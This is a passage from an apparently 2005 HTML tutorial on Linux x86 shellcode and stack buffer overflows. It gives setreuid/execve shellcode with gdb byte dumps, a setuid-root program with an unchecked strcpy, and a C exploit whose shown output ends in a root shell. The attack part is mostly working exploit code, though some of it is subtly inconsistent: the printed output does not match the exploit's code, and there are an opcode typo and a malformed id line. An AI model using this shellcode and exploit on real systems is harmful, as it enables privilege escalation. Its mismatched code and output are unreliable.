+0x804830c &lt;main+24&gt;: int $0x80<br>
+0x804830e &lt;main+26&gt;: leave<br>
+0x804830f &lt;main+27&gt;: ret<br>
+End of assembler dump.<br>
+(gdb) x/bx main+16<br>
+0x8048304 &lt;main+16&gt;: 0x31<br>
+(gdb)<br>
+0x8048305 &lt;main+17&gt;: 0xc0<br>
+(gdb)<br>
+0x8048306 &lt;main+18&gt;: 0x31<br>
+(gdb)<br>
+0x8048307 &lt;main+19&gt;: 0xdb<br>
+(gdb)<br>
+0x8048308 &lt;main+20&gt;: 0x31<br>
+(gdb)<br>
+0x8048309 &lt;main+21&gt;: 0xc9<br>
+(gdb)<br>
+0x804830a &lt;main+22&gt;: 0xb0<br>
+(gdb)<br>
+0x804830b &lt;main+23&gt;: 0x46<br>
+(gdb)<br>
+0x804830c &lt;main+24&gt;: 0xcd<br>
+(gdb)<br>
+0x804830d &lt;main+25&gt;: 0x80<br>
+(gdb) quit</font></font> <br>
+<font size="2" face="Verdana, Arial, Helvetica, sans-serif"><font face="Courier New, Courier, mono">[posidron@localhost
+posidron]$</font></font><br>
+<br>
+<br>
+<font color="#333333"><em>&#8226; </em></font><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>execv()
+bytecode</strong></font> <br>
+<br>
+<table width="100%" border="0" cellspacing="2" cellpadding="0">
+  <tr valign="top">
+    <td bgcolor="#A7BDA6"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>execv_asm.c</strong></font></td>
+  </tr>
+  <tr valign="top">
+    <td height="128" bgcolor="#F6FAF0"><font size="2" face="Courier New, Courier, mono">
+      int main (void) {<br>
+      &nbsp;&nbsp;__asm__(&quot;<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;xor %eax, %eax // clear %eax for this syscall<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;push %eax<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;push $0x68732f2f<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;push $0x6e69622f<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;mov %esp, %ebx<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;push %eax<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;push %ebx<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;mov %esp, %ecx<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;mov $0xb,%al // instead of %eax to erease the 0
+      bytes<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;int $0x80<br>
+      &quot;);</font></td>
+  </tr>
+</table>
+<br>
+<font size="2" face="Courier New, Courier, mono">[posidron@localhost posidron]$
+gcc execv_asm.c -o execv_asm<br>
+[posidron@localhost posidron]$ ./execv_asm<br>
+sh-2.05b$ exit<br>
+exit<br>
+[posidron@localhost posidron]$ gdb -q ./execv_asm<br>
+(gdb) disas main<br>
+Dump of assembler code for function main:<br>
+0x80482f4 &lt;main+0&gt;: push %ebp<br>
+0x80482f5 &lt;main+1&gt;: mov %esp,%ebp<br>
+0x80482f7 &lt;main+3&gt;: sup $0x8, %esp<br>
+0x80482fa &lt;main+6&gt;: and $0xfffffff0,%esp<br>
+0x80482fd &lt;main+9&gt;: mov $0x0,%eax<br>
+0x8048302 &lt;main+14&gt;: sub %eax,%ebx<br>
+0x8048304 &lt;main+16&gt;: xor %eax, %eax<br>
+0x8048306 &lt;main+18&gt;: push %eax<br>
+0x8048307 &lt;main+19&gt;: push $0x68732f2f<br>
+0x804830c &lt;main+24&gt;: push $0x6e69622f<br>
+0x8048311 &lt;main+29&gt;: mov %esp, %ebx<br>
+0x8048313 &lt;main+31&gt;: push %eax<br>
+0x8048314 &lt;main+32&gt;: push %ebx<br>
+0x8048315 &lt;main+33&gt;: mov %esp, %ecx<br>
+0x8048317 &lt;main+35&gt;: mov $0xb,%al<br>
+0x8048319 &lt;main+37&gt;: int $0x80<br>
+0x804831b &lt;main+39&gt;: leave<br>
+0x804831c &lt;main+40&gt;: ret<br>
+0x804831d &lt;main+41&gt;: nop<br>
+0x804831e &lt;main+42&gt;: nop<br>
+0x804831f &lt;main+43&gt;: nop<br>
+End of assembler dump.<br>
+(gdb) x/bx main+16<br>
+0x8048304 &lt;main+16&gt;: 0x31<br>
+(gdb)<br>
+0x8048305 &lt;main+17&gt;: 0xc0<br>
+(gdb)<br>
+0x8048306 &lt;main+18&gt;: 0x50<br>
+(gdb)<br>
+0x8048307 &lt;main+19&gt;: 0x68<br>
+(gdb)<br>
+0x8048308 &lt;main+20&gt;: 0x2f<br>
+(gdb)<br>
+0x8048309 &lt;main+21&gt;: 0x2f<br>
+(gdb)<br>
+0x804830a &lt;main+22&gt;: 0x73<br>
+(gdb)<br>
+0x804830b &lt;main+23&gt;: 0x68<br>
+(gdb)<br>
+0x804830c &lt;main+24&gt;: 0x68<br>
+(gdb)<br>
+0x804830d &lt;main+25&gt;: 0x2f<br>
+(gdb)<br>
+0x804830e &lt;main+26&gt;: 0x62<br>
+(gdb)<br>
+0x804830f &lt;main+27&gt;: 0x69<br>
+(gdb)<br>
+0x8048310 &lt;main+28&gt;: 0x6e<br>
+(gdb)<br>
+0x8048311 &lt;main+29&gt;: 0x89<br>
+(gdb)<br>
+0x8048312 &lt;main+30&gt;: 0xe3<br>
+(gdb)<br>
+0x8048313 &lt;main+31&gt;: 0x50<br>
+(gdb)<br>
+0x8048314 &lt;main+32&gt;: 0x53<br>
+(gdb)<br>
+0x8048315 &lt;main+33&gt;: 0x89<br>
+(gdb)<br>
+0x8048316 &lt;main+34&gt;: 0xe1<br>
+(gdb)<br>
+0x8048317 &lt;main+35&gt;: 0xb0<br>
+(gdb)<br>
+0x8048318 &lt;main+36&gt;: 0x0b<br>
+(gdb)<br>
+0x8048319 &lt;main+37&gt;: 0xcd<br>
+(gdb)<br>
+0x804831a &lt;main+38&gt;: 0x80<br>
+(gdb) quit<br>
+</font><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><font face="Courier New, Courier, mono">[posidron@localhost
+posidron]$</font></font><br>
+<br>
+<br>
+<font color="#333333"><em>&#8226; </em></font><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>Execution</strong></font><br>
+<br>
+<table width="100%" border="0" cellspacing="2" cellpadding="0">
+  <tr valign="top">
+    <td bgcolor="#A7BDA6"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>Summary</strong></font></td>
+  </tr>
+  <tr valign="top">
+    <td height="128" bgcolor="#F6FAF0"><font size="2" face="Courier New, Courier, mono">
+      #include &lt;stdio.h&gt;</font> <font size="2" face="Courier New, Courier, mono"><br>
+      <br>
+      char shellcode[]= &quot;\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80&quot; /*
+      setreuid(0,0); */</font> <br>
+      <font size="2" face="Courier New, Courier, mono">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62&quot;
+      /* execv */<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</font>
+      <font size="2" face="Courier New, Courier, mono"><br>
+      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+      &quot;\x31\xc0\x31\xdb\xb0\x01\xcd\x80&quot;; /* exit(0); */</font><font size="2" face="Courier New, Courier, mono"><br>
+      <br>
+      int main (void) {<br>
+      &nbsp;&nbsp;void (*t) (void);<br>
+      &nbsp;&nbsp;t = (void*)shellcode;<br>
+      &nbsp;&nbsp;fprintf(stdout, &quot;Size: %d bytes.\n&quot;, sizeof(shellcode));<br>
+      &nbsp;&nbsp;t();</font><font size="2" face="Courier New, Courier, mono">
+      <br>
+      &nbsp; return 0;<br>
+      }</font></td>
+  </tr>
+</table>
+<br>
+<font size="2" face="Courier New, Courier, mono">[posidron@localhost posidron]$
+gcc sh.c -o sh<br>
+[posidron@localhost posidron]$ ./sh<br>
+size: 41 bytes<br>
+sh-2.05b# exit<br>
+exit<br>
+[posidron@localhost posidron]$<br>
+<br>
+<br>
+</font><font color="#333333"><em>&#8226; </em></font><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>Buffer
+overflow example</strong></font><br>
+<font size="2" face="Courier New, Courier, mono"><br>
+</font>
+<table width="100%" border="0" cellspacing="2" cellpadding="0">
+  <tr valign="top">
+    <td bgcolor="#A7BDA6"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Vulnerable
+      program</font></td>
+  </tr>
+  <tr valign="top">
+    <td height="128" bgcolor="#F6FAF0"><font size="2" face="Courier New, Courier, mono">
+      #include &lt;stdio.h&gt;</font> <p><font size="2" face="Courier New, Courier, mono">#define
+        MAX_SIZE 128</font></p>
+      <p><font size="2" face="Courier New, Courier, mono">int main (int argc,
+        char **argv) {<br>
+        &nbsp;&nbsp;char cmd[MAX_SIZE];<br>
+        <br>
+        &nbsp;&nbsp;if&nbsp;(!(argc &gt; 1)) {<br>
+        &nbsp;&nbsp;&nbsp; fprintf(stdout, &quot;No parameter!\n&quot;); <br>
+        &nbsp;&nbsp;&nbsp; return -1;<br>
+        &nbsp; }</font></p>
+      <p><font size="2" face="Courier New, Courier, mono"> &nbsp;&nbsp;if&nbsp;(argc
+        &gt;= 1)&nbsp;{&nbsp;<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;strcpy(cmd,argv[1]);<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;fprintf(stdout, &quot;Input: %s\n&quot;, cmd);
+        <br>
+        &nbsp; }<br>
+        <br>
+        &nbsp;&nbsp;&nbsp;&nbsp;return 0;<br>
+        }</font></p></td>
+  </tr>
+</table>
+<font size="2" face="Courier New, Courier, mono"><br>
+[posidron@localhost posidron]$ gcc vuln.c -o vuln<br>
+[posidron@localhost posidron]$ su<br>
+Password:<br>
+[root@localhost posidron]# chown root.root vuln<br>
+[root@localhost posidron]# chmod 4775 vuln<br>
+[root@localhost posidron]# ls -al vuln<br>
+-rwsrwxr-x 1 root root 11834 17. Aug 23.14 vuln<br>
+[root@localhost posidron]# exit<br>
+exit<br>
+[posidron@localhost posidron]$ ulimit -c unlimited<br>
+[posidron@localhost posidron]$ ./vuln `perl -e 'print &quot;A&quot; x 144'`<br>
+Segmentation fault (core dumped)<br>
+[posidron@localhost posidron]$ gdb -q -c core.4104<br>
+Core was generated by './vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAA'.<br>
+Program terminated with Signal 11, Segmentation fault.<br>
+#0 0x41414141 in ?? () <br>
+(gdb) quit<br>
+[posidron@localhost posidron]$</font> <br>
+<br>
+<br>
+<font color="#333333"><em>&#8226; </em></font><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>Buffer
+overflow exploit</strong></font><br>
+<br>
+<table width="100%" border="0" cellspacing="2" cellpadding="0">
+  <tr valign="top">
+    <td bgcolor="#A7BDA6"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>Exploit</strong></font></td>
+  </tr>
+  <tr valign="top">
+    <td height="128" bgcolor="#F6FAF0"> <font size="2" face="Courier New, Courier, mono">#include
+      &lt;stdio.h&gt;<br>
+      #include &lt;stdlib.h&gt;<br>
+      #include &lt;string.h&gt;<br>
+      #include &lt;unistd.h&gt;<br>
+      <br>
+      char shell[] = &quot;\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31&quot;<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69&quot;<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x31\xc0\x31\xdb\xb0\x01\xcd\x80&quot;;
+      </font><font face="Courier New, Courier, mono">
+      <p><font size="2" face="Courier New, Courier, mono">#define BINARY &quot;./vuln&quot;</font></p>
+      <p><font size="2" face="Courier New, Courier, mono">int main (int argc,
+        char **argv) {<br>
+        &nbsp;&nbsp;char *cmd[3], *env[2], payload[155], tmp[1036];<br>
+        &nbsp;&nbsp;unsigned int xaddr;</font></p>
+      <p><font size="2" face="Courier New, Courier, mono"> &nbsp;&nbsp;memset(tmp,
+        'X', 1032);<br>
+        &nbsp;&nbsp;xaddr = 0xbffffffa - strlen(shell) - strlen(BINARY);<br>
+        &nbsp;&nbsp;printf(&quot;{-} return address: 0x%x\n&quot;, xaddr);</font></p>
+      <font size="2" face="Courier New, Courier, mono"> &nbsp;&nbsp;tmp[1013]
+      = (xaddr &amp; 0x000000ff) &gt;&gt; 0;<br>
+      &nbsp;&nbsp;tmp[1014] = (xaddr &amp; 0x0000ff00) &gt;&gt; 8;<br>
+      &nbsp;&nbsp;tmp[1015] = (xaddr &amp; 0x00ff0000) &gt;&gt; 16;<br>
+      &nbsp;&nbsp;tmp[1016] = (xaddr &amp; 0xff000000) &gt;&gt; 24;<br>
+      &nbsp;&nbsp;tmp[1017] = '\0'; </font><font face="Courier New, Courier, mono">
+      <p><font size="2"> &nbsp;</font><font size="2">&nbsp;cmd[0] = BINARY;<br>
+        &nbsp;&nbsp;cmd[1] = payload;<br>
+        &nbsp;&nbsp;cmd[2] = NULL;</font></p>
+      <p><font size="2"> &nbsp;&nbsp;env[0] = shell;<br>
+        &nbsp;&nbsp;env[1] = NULL;</font></p>
+      <p><font size="2"> &nbsp;&nbsp;execve(cmd[0], cmd, env);</font></p>
+      </font></font> <p><font size="2" face="Courier New, Courier, mono"> &nbsp;&nbsp;return
+        -1;<br>
+        }</font><br>
+      </p>
+      </td>
+  </tr>
+</table>
+<br>
+<font size="2" face="Courier New, Courier, mono">[posidron@localhost posidron]$ gcc exploit.c
+-o exploit<br>
+[posidron@localhost posidron]$ id<br>
+uid=500(posidron) gid=500(posidron) groups=500(posidron)<br>
+[posidron@localhost posidron]$ ./exploit 200<br>
+stack pointer: 0xbfffe778<br>
+used offset: 0xc8<br>
+jumping to address: 0xbfffe6c0<br>
+Input: 1???F1?hn/shh//bi?PS<br>
+$<br>
+1????????????????<br>
+sh-2.05b# id<br>
+uid=0(root) gid=(posidron) groups=500(posidron)</font><br>
+<br>
+<br>
+<font color="#333333"><em>&#8226; </em></font> <font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>Bibliography</strong><br>
+<br>
+The Art of Assembly Language<br>
+- http://webster.cs.ucr.edu/Page_AoALinux/HTML/AoATOC.html<br>
+<br>
+Linux System Call Table<br>
+- http://world.std.com/~slanning/asm/syscall_list.html<br>
+<br>
+GDB Online Documentation<br>
+- http://www.gnu.org/manual/gdb-5.1.1/html_chapter/gdb_toc.html<br>
+<br>
+GCC Online Documentation<br>
+- http://gcc.gnu.org/onlinedocs/gcc-3.3.1/gcc/ <br>
+<br>
+</font>
+<HR SIZE=1>
+<font size="2" face="Verdana, Arial, Helvetica, sans-serif">&copy; Copyright 2005 - Tripbit
+</font>
+</body>
+</html>
